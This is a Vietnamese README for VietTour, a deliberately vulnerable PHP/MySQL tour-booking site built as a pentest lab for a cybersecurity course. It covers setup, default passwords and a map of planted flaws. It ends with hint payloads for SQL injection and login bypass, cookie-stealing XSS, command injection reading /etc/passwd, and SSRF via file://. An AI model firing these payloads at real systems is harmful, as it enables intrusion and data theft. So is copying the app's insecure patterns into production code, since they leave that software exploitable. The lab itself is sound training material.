# VietTour — Vulnerable Web Application

> ⚠️ **CẢNH BÁO**: Đây là ứng dụng web **CỐ TÌNH CHỨA LỖ HỔNG BẢO MẬT** phục vụ cho bài thực hành pentest.
> **KHÔNG TRIỂN KHAI trên môi trường production hoặc public internet.**

## 📋 Mô tả

VietTour là website đặt tour du lịch được xây dựng bằng PHP + MySQL. Ứng dụng đi kèm nhiều lỗ hổng bảo mật phổ biến phục vụ cho 18 kịch bản pentest của lab CyberSec Semester 4.

## 🏗️ Kiến trúc

```
webapp/
├── config.php              # Cấu hình DB, session, hàm auth
├── index.php               # Trang chủ — tour nổi bật
├── search.php              # Tìm kiếm tour (Reflected XSS, SQLi)
├── tour.php                # Chi tiết tour (SQLi, Stored XSS)
├── booking.php             # Đặt tour (CSRF, SQLi)
├── review.php              # Gửi đánh giá (Stored XSS)
├── upload.php              # Upload biên lai (File Upload bypass)
├── preview.php             # Xem trước URL (SSRF)
├── login.php               # Đăng nhập (MD5, SQLi, User Enum)
├── register.php            # Đăng ký (Weak password)
├── profile.php             # Hồ sơ cá nhân (IDOR)
├── change-password.php     # Đổi mật khẩu (IDOR)
├── logout.php              # Đăng xuất
├── admin/
│   ├── dashboard.php       # Admin dashboard (Command Injection)
│   ├── users.php           # Quản lý user (IDOR, CSRF delete)
│   ├── tours.php           # Quản lý tour (SQLi)
│   ├── bookings.php        # Quản lý booking
│   ├── reviews.php         # Quản lý review (Stored XSS visible)
│   └── tools.php           # Server tools (CMDi, SSRF, phpinfo)
├── api/
│   ├── tours.php           # REST API tours (SQLi, no auth DELETE)
│   ├── bookings.php        # REST API bookings (JWT bypass, IDOR)
│   └── auth.php            # REST API auth (JWT, user enum)
├── includes/
│   ├── header.php          # HTML header + nav
│   ├── footer.php          # HTML footer
│   └── functions.php       # Helper functions
├── assets/
│   ├── css/style.css       # Main stylesheet
│   ├── css/admin.css       # Admin stylesheet
│   └── js/app.js           # Frontend JS
├── uploads/                # Thư mục upload (777)
├── db/setup.sql            # Database schema + seed data
├── .htaccess               # Apache config (vuln)
└── README.md               # File này
```

## 🚀 Triển khai trên VM3 (Ubuntu 22.04)

### Yêu cầu
- Ubuntu Server 22.04 LTS
- Apache 2.4 + PHP 8.1 + MySQL 8.0
- IP: `172.99.100.30` (DMZ)

### Bước 1: Cài đặt LAMP Stack

```bash
# Update & install
sudo apt update && sudo apt upgrade -y
sudo apt install -y apache2 mysql-server php php-mysql php-curl php-gd libapache2-mod-php

# Enable modules
sudo a2enmod rewrite
sudo systemctl restart apache2
```

### Bước 2: Copy source code

```bash
# Copy thư mục webapp vào web root
sudo cp -r webapp/ /var/www/html/viettour
sudo chown -R www-data:www-data /var/www/html/viettour
sudo chmod -R 755 /var/www/html/viettour

# Tạo thư mục upload với quyền ghi (intentionally insecure)
sudo mkdir -p /var/www/html/viettour/uploads/receipts
sudo chmod -R 777 /var/www/html/viettour/uploads
```

### Bước 3: Cấu hình Apache

```bash
sudo nano /etc/apache2/sites-available/viettour.conf
```

Nội dung:
```apache
<VirtualHost *:80>
    ServerName viettour.local
    ServerAlias 172.99.100.30
    DocumentRoot /var/www/html/viettour

    <Directory /var/www/html/viettour>
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/viettour-error.log
    CustomLog ${APACHE_LOG_DIR}/viettour-access.log combined
</VirtualHost>
```

```bash
sudo a2ensite viettour.conf
sudo systemctl reload apache2
```

### Bước 4: Setup Database

```bash
# Đăng nhập MySQL
sudo mysql -u root

# Chạy script setup (trong MySQL)
source /var/www/html/viettour/db/setup.sql;

# Hoặc từ terminal
sudo mysql -u root < /var/www/html/viettour/db/setup.sql
```

### Bước 5: Kiểm tra

```bash
# Test web
curl http://172.99.100.30/
curl http://viettour.local/

# Test database
mysql -u viettour_user -p'P@ssw0rd123' -e "USE viettour_db; SHOW TABLES;"
```

## 🔓 Danh sách Lỗ hổng & Scenario Mapping

| Lỗ hổng | Scenario | File | Mô tả |
|---------|----------|------|--------|
| **SQL Injection** | S04 | tour.php, search.php, booking.php, login.php | `$_GET['id']` nối trực tiếp vào SQL |
| **Reflected XSS** | S05 | search.php | `$_GET['q']` echo vào HTML không escape |
| **Stored XSS** | S05 | review.php → tour.php | Comment lưu và hiển thị không escape |
| **Session Hijack** | S05 | login.php | Không regenerate session ID |
| **File Upload** | S06 | upload.php | Chỉ check extension, không check MIME |
| **IDOR** | S15 | profile.php, api/bookings.php | `?id=` parameter truy cập data người khác |
| **JWT Bypass** | S15 | api/bookings.php, api/auth.php | `alg: none` bypass, secret yếu |
| **CSRF** | S16 | booking.php, admin/users.php | Không có CSRF token |
| **SSRF** | S16 | preview.php, admin/tools.php | Fetch URL do user cung cấp |
| **Command Injection** | S17 | admin/dashboard.php, admin/tools.php | `shell_exec("ping " . $host)` |
| **Info Disclosure** | S03 | .htaccess, admin/tools.php | Directory listing, phpinfo(), .git |
| **Weak Auth** | S04 | login.php, register.php | MD5 passwords, password = "admin123" |
| **User Enumeration** | S03 | login.php, api/auth.php | Phản hồi khác nhau cho user sai vs pass sai |
| **API No Auth** | S17 | api/tours.php | DELETE endpoint không cần auth |

## 👤 Tài khoản mặc định

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| manager | manager2026 | manager |
| user1 | password123 | user |
| user2 | password123 | user |
| guide1 | guide@2026 | user |
| reviewer1 | reviewer123 | user |
| tourist1 | tourist2026 | user |

## 💡 Gợi ý Pentest

### SQL Injection (S04)
```
# Union-based
http://viettour.local/tour.php?id=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11--

# Boolean-based
http://viettour.local/tour.php?id=1 AND 1=1
http://viettour.local/tour.php?id=1 AND 1=2

# Login bypass
Username: admin' OR '1'='1
Password: anything
```

### XSS (S05)
```
# Reflected XSS
http://viettour.local/search.php?q=<script>alert('XSS')</script>

# Stored XSS (trong review comment)
<img src=x onerror=alert(document.cookie)>
```

### Command Injection (S17)
```
# Trong Admin > Server Tools > Ping
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami
127.0.0.1 | ls -la /var/www/html
```

### SSRF (S16)
```
# Trong preview.php hoặc Admin Tools > cURL
http://viettour.local/preview.php?url=file:///etc/passwd
http://viettour.local/preview.php?url=http://172.99.10.10/admin
```

### IDOR (S15)
```
# Xem profile người khác
http://viettour.local/profile.php?id=1
http://viettour.local/profile.php?id=2

# API với forged JWT (alg=none)
```

---

**⚠️ Chỉ sử dụng trong môi trường lab. Không triển khai trên internet.**
